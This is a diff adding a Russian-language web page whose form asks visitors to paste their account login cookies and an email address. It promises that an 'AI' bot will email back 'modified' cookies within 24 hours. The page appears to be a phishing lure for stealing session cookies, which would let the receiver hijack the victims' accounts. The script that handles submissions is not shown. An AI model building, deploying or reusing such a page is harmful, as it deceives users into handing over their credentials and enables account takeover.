@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookie</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="card">
+    <h2>Получение Cookie аккаунта для входа</h2>
+    <div class="subtitle">Напишите Cookie аккаунта, вместе с почтой, на которую вам придут изменённые Cookie от бота (AI).</div>
+
+    <form id="contactForm">
+        <div class="form-group">
+            <label>Ваша почта</label>
+            <input type="email" id="email" placeholder="example@mail.ru/gmail.com (любая почта)" required>
+        </div>
+        <div class="form-group">
+            <label>Cookie</label>
+            <textarea id="message" placeholder="Cookie аккаунта" required></textarea>
+        </div>
+        <button type="submit" class="btn" id="submitBtn">Отправить →</button>
+    </form>
+
+    <div id="status"></div>
+    <div class="hint">Ответ от бота на вашу почту придёт в течение 24 часов.</div>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
